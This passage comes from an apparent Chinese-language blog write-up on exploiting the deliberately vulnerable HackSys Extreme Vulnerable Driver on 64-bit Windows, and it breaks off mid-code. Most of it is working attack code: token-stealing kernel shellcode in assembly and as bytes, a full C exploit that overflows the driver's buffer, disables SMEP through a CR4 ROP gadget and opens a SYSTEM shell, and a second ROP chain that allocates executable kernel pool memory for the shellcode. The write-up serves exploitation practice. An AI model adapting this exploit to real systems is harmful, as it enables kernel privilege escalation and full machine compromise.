list</span><br><span class="line">mov rax, [rax + 0x448]; +0x448 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link</span><br><span class="line">mov rax, [rax]; Follow the first link</span><br><span class="line">system_process_loop:</span><br><span class="line">mov rdx, [rax - 0x8]; ProcessId</span><br><span class="line">mov r8, rax;; backup system EPROCESS.ActiveProcessLinks pointer at r8</span><br><span class="line">mov rax, [rax]; Next process</span><br><span class="line">cmp rdx, 4; System PID</span><br><span class="line">jnz system_process_loop</span><br><span class="line"></span><br><span class="line">mov rdx, [r8 + 0x70]</span><br><span class="line">and rdx, 0xfffffffffffffff8; Ignore ref count</span><br><span class="line">mov rcx, [r9 + 0x4b8]</span><br><span class="line">and rcx, 0x7</span><br><span class="line">add rdx, rcx; put target&#x27;s ref count into our token</span><br><span class="line">mov [r9 + 0x4b8], rdx; rdx = system token; KPROCESS+0x4b8 is the Token, KPROCESS+0x448 is the process links - 0x70 is the diff</span><br><span class="line"></span><br><span class="line">;db 0xcc</span><br><span class="line">ret_to_usermode:</span><br><span class="line">;sti</span><br><span class="line">mov rax, [gs:0x188]; _KPCR.Prcb.CurrentThread</span><br><span class="line">mov cx, [rax + 0x1e4]; KTHREAD.KernelApcDisable</span><br><span class="line">inc cx</span><br><span class="line">mov [rax + 0x1e4], cx</span><br><span class="line">mov rdx, [rax + 0x90] ; ETHREAD.TrapFrame</span><br><span class="line">mov rcx, [rdx + 0x168]; ETHREAD.TrapFrame.Rip</span><br><span class="line">mov r11, [rdx + 0x178]; ETHREAD.TrapFrame.EFlags</span><br><span class="line">mov rsp, [rdx + 0x180]; ETHREAD.TrapFrame.Rsp</span><br><span class="line">mov rbp, [rdx + 0x158]; ETHREAD.TrapFrame.Rbp</span><br><span class="line">;db 0xcc</span><br><span class="line">xor eax, eax ; return STATUS_SUCCESS to NtDeviceIoControlFile </span><br><span class="line">swapgs</span><br><span class="line">o64 sysret; nasm shit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECTION .end_magic     </span><br><span class="line">db &quot;magic2&quot; </span><br></pre></td></tr></table></figure><p>可以看到shellcode整体上除了相关结构的偏移不一致外,主要差异为</p><ol><li>对token指针的引用计数位段进行清空</li><li>额外对CurrentThread-&gt;KernelApcDisable字段加1,保证APC状态的一致,避免BSOD<code>APC_INDEX_MISMATCH</code></li><li>更合规的内核态退出结尾</li></ol><p>使用nasm将其编译后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f win64 sc.<span class="keyword">asm</span> -o sc.obj</span><br></pre></td></tr></table></figure><p>再使用ida等工具获取shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_221518.png" alt=""></p><p>完整的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QWORD ULONGLONG</span></span><br><span class="line"></span><br><span class="line">BYTE dst_sc[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">QWORD <span class="title function_">getBaseAddr</span><span class="params">(LPCWSTR drvName)</span> &#123;</span><br><span class="line">  LPVOID drivers[<span class="number">512</span>];</span><br><span class="line">  DWORD cbNeeded;</span><br><span class="line">  <span class="type">int</span> nDrivers, i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (EnumDeviceDrivers(drivers, <span class="keyword">sizeof</span>(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; <span class="keyword">sizeof</span>(drivers)) &#123;</span><br><span class="line">    WCHAR szDrivers[<span class="number">512</span>];</span><br><span class="line">    nDrivers = cbNeeded / <span class="keyword">sizeof</span>(drivers[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nDrivers; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (GetDeviceDriverBaseName(drivers[i], szDrivers, <span class="keyword">sizeof</span>(szDrivers) / <span class="keyword">sizeof</span>(szDrivers[<span class="number">0</span>]))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (wcscmp(szDrivers, drvName) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> (QWORD)drivers[i];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE hDriver = CreateFile(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Error while creating a handle to the driver: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  QWORD ntBase = getBaseAddr(<span class="string">L&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] NTBase: %llx\n&quot;</span>, ntBase);</span><br><span class="line">  QWORD POP_RCX = ntBase + <span class="number">0x202e71</span>;</span><br><span class="line">  QWORD MOV_CR4_RCX = ntBase + <span class="number">0x3a0bd7</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> bufSize = <span class="number">2072</span> + <span class="number">4</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  LPVOID uBuffer = VirtualAlloc(<span class="literal">NULL</span>, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  LPVOID shellcode = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">256</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  RtlFillMemory(uBuffer, bufSize, <span class="string">&#x27;\x41&#x27;</span>);</span><br><span class="line">  RtlCopyMemory(shellcode, dst_sc, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">  QWORD* rop = (QWORD*)((QWORD)uBuffer + <span class="number">2072</span>);</span><br><span class="line"></span><br><span class="line">  *(rop + index++) = POP_RCX;</span><br><span class="line">  *(rop + index++) = <span class="number">0x350ef8</span> ^ <span class="number">1UL</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">  *(rop + index++) = MOV_CR4_RCX;</span><br><span class="line">  *(rop + index++) = (QWORD)shellcode;</span><br><span class="line"></span><br><span class="line">  DeviceIoControl(hDriver, <span class="number">0x222003</span>, (LPVOID)uBuffer, bufSize, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Enjoy your shell!\n&quot;</span>, ntBase);</span><br><span class="line">  system(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_221904.png" alt=""></p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><p>第二种方式怎么试都没成功,明明都已经执行到shellcode了,但总是会有千奇百怪的错误(断点打在不同处竟然结果就会不一样…)</p><p>调试调到晕厥,就这样吧以后再研究</p><hr><p>对第二种方式完全使用gadget过于困难,所以还是要想办法在内核中执行shellcode,但要执行代码就肯定需要可控的可写可执行内存块</p><h4 id="分配内核可执行内存"><a href="#分配内核可执行内存" class="headerlink" title="分配内核可执行内存"></a>分配内核可执行内存</h4><p>驱动程序的开发人员可以分配不同类型的内存池。最基本的两类是分页池和非分页池类型。前者分配了一个不可执行的页式内存池以供使用，而后者分配了一个非页式池，默认情况下是可执行的。可以通过调用带有所需参数的 ExAllocatePoolWithTag()函数来执行分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PVOID <span class="title function_">ExAllocatePoolWithTag</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,</span></span><br><span class="line"><span class="params">  [in] SIZE_T                                         NumberOfBytes,</span></span><br><span class="line"><span class="params">  [in] ULONG                                          Tag</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ol><li><strong><code>PoolType</code></strong>:指定内存池的类型。常见的类型包括：<ul><li><strong><code>NonPagedPool</code></strong>：未分页内存池，分配的内存不会被交换到磁盘，适用于中断服务例程（ISR）等需要快速访问的场景。</li><li><strong><code>PagedPool</code></strong>：分页内存池，分配的内存可能会被交换到磁盘，适用于不需要在中断上下文中访问的场景。</li><li><strong><code>NonPagedPoolNx</code></strong>：未分页内存池，且内存不可执行（No Execute），适用于安全敏感的场景。</li><li><strong><code>PagedPoolNx</code></strong>：分页内存池，且内存不可执行（No Execute）。</li></ul></li><li><strong><code>NumberOfBytes</code></strong>:要分配的内存大小（以字节为单位）。</li><li><strong><code>Tag</code></strong>:用于标识内存分配的标签（4 个字符）。标签通常用于调试和内存泄漏检测。</li></ol><p>这个函数无法在用户态使用,但是现在我们已经破除了kaslr,我们已经可以知道他在内核的加载位置了</p><p>那么我们可以利用rop去调用这个位置,并设置合适的参数即可</p><h4 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h4><p>使用ROPgadget或ropper这样的工具查找<code>C:\Windows\System32\ntoskrnl.exe</code>的gadget</p><p>足足找出了12m文本的gadgets,我们需要找怎样的gadget呢,windows的调用约定与linux有所不同,只用四个寄存器作为传参寄存器,剩余用栈传递,分别是rcx, rdx, r8, r9</p><p>我们现在要做的是,分配一块可执行的内存,然后将用户态的shellcode复制到内核态使用</p><p>我们的ROP链应该像这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx; ret; -&gt; zeroes out our RCX register, which is the first parameter of AllocatePoolWithTag()</span><br><span class="line">pop rdx; ret ; -&gt; pops 0x1000 (4096) to rdx register, which is the second parameter of AllocatePoolWithTag() and indicates the size of the pool</span><br><span class="line">0x1000 -&gt; value of rdx</span><br><span class="line">AllocatePoolWithTag() -&gt; calls the AllocatePoolWithTag function. The address of the allocated pool will then be in rax</span><br><span class="line">mov rcx, rax; ret; -&gt; copies the address to rcx, which will be first parameter of memcpy</span><br><span class="line">pop rdx; ret -&gt; gets the source address from stack. This will be our shellcode in userland that will escalate privileges.</span><br><span class="line">&lt;ADDRESS OF SHELLCODE&gt;</span><br><span class="line">0x0000000140201861: pop r8; ret;  -&gt; gets the size from stack.</span><br><span class="line">&lt;SIZE OF SHELLCODE&gt;</span><br><span class="line">memcpy() -&gt; calls the memcpy function and copies our payload to an executable kernel space</span><br><span class="line">jmp rax; -&gt; jumps to a register which stores the address of our shellcode in kernel land</span><br></pre></td></tr></table></figure><p>这是我们能够找到的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x202e71</span>: pop rcx; ret;</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line"><span class="number">0x1000</span></span><br><span class="line">AllocatePoolWithTag()</span><br><span class="line"><span class="number">0x5b6164</span>: push rax; pop r13; ret;</span><br><span class="line"><span class="number">0x2714f6</span>: xchg r8, r13; ret; </span><br><span class="line"><span class="number">0x94133a</span>: mov rcx, r8; mov rax, rcx; ret; </span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line">&lt;address of shellcode location in userland&gt;</span><br><span class="line"><span class="number">0x201861</span>: pop r8; ret; </span><br><span class="line"><span class="built_in">memcpy</span>() -&gt; calls the <span class="built_in">memcpy</span> function and copies our payload to an executable kernel space</span><br><span class="line"><span class="number">0x24b024</span>: jmp rax;</span><br></pre></td></tr></table></figure><p>显然很难找到完美符合要求的gadget,当然实际上因为我们之前已经把所有驱动的基址都打印出来了,也可以去其他的驱动中寻找gadget</p><p>不过即使这样,我们还没有完成gadget的编写</p><p>因为在x86-64 上的 Microsoft fastcall 调用约定中特有一个特有的概念叫做Shadow Space</p><blockquote><p>Shadow Space 是为函数调用预留的堆栈空间，通常由调用者分配，用于存储前四个通过寄存器传递的参数（<code>RCX</code>, <code>RDX</code>, <code>R8</code>, <code>R9</code>）。</p><p>即使参数实际上是通过寄存器传递的，调用者仍然需要在堆栈上分配 32 字节（每个寄存器占 8 字节）的空间。</p></blockquote><p>而我们需要调用的AllocatePoolWithTag()就是这样一个函数(一个分支的汇编如下)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nt!ExAllocatePoolWithTag:</span><br><span class="line">fffff807`39fb8010 48895c2408      mov     qword ptr [rsp+8],rbx</span><br><span class="line">fffff807`39fb8015 48896c2410      mov     qword ptr [rsp+10h],rbp</span><br><span class="line">fffff807`39fb801a 4889742418      mov     qword ptr [rsp+18h],rsi</span><br><span class="line">fffff807`39fb801f 57              push    rdi</span><br><span class="line">fffff807`39fb8020 4156            push    r14</span><br><span class="line">fffff807`39fb8022 4157            push    r15</span><br><span class="line">fffff807`39fb8024 4883ec30        sub     rsp,30h</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>可以看到其函数刚开始就会将rbx,rbp,rsi保存在rsp+8等位置,所以我们直接用上面获得rop链的话,那么我们的rop链就会被覆盖从而失效</p><p>所以我们要么在函数开始前<code>sub rsp 0x20 ret</code>结束后<code>add rsp 0x20 ret</code>,要么直接预留0x20无用空间供其写入</p><p>显然第二种方法会更简单一些因为我们只需要<code>add rsp 0x20 ret</code>这个gadget</p><p>那么我们完整的rop链应该长这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x202e71</span>: pop rcx; ret;</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line"><span class="number">0x1000</span></span><br><span class="line">AllocatePoolWithTag()</span><br><span class="line"><span class="number">0xa1b718</span>: add rsp, <span class="number">0x20</span>; ret;</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x5b6164</span>: push rax; pop r13; ret;</span><br><span class="line"><span class="number">0x2714f6</span>: xchg r8, r13; ret; </span><br><span class="line"><span class="number">0x94133a</span>: mov rcx, r8; mov rax, rcx; ret; </span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line">&lt;address of shellcode location in userland&gt;</span><br><span class="line"><span class="number">0x201861</span>: pop r8; ret; </span><br><span class="line"><span class="built_in">memcpy</span>() -&gt; calls the <span class="built_in">memcpy</span> function and copies our payload to an executable kernel space</span><br><span class="line"><span class="number">0x02b92f1</span>: jmp rax;</span><br></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QWORD ULONGLONG</span></span><br><span class="line"></span><br><span class="line">BYTE dst_sc[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">    